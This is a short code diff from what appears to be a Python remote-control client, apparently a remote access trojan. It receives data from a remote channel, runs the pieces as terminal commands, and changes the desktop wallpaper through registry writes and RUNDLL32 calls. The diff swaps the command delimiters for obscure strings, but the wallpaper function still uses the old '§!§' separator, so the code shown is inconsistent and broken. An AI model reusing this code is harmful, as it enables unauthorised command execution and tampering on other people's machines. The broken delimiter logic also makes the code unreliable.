@@ -108,7 +108,7 @@ def wallpaper(data):
     severalcmd('reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True §!§reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Imge.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True§!§reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True ')
     
 def severalcmd(data, temp=0.05):
-    datalist = data.split("§!§")
+    datalist = data.split("98!89")
     for i in datalist:
         print(i)
         terminal(i)
@@ -159,12 +159,13 @@ def receive(timeoutKill):
             print(receive)
             progrun = False
             run = False
-        if receive != "É":
+        if receive != "9":
             return receive
 
 def execute(data):
     global run, sortir, ossys, reloading
-    data = data.replace("●", "")
+    data = data.replace("9", "")
+    data = data.replace("1+8", "9")
     datalist = data.split()
     if not datalist:
         return None
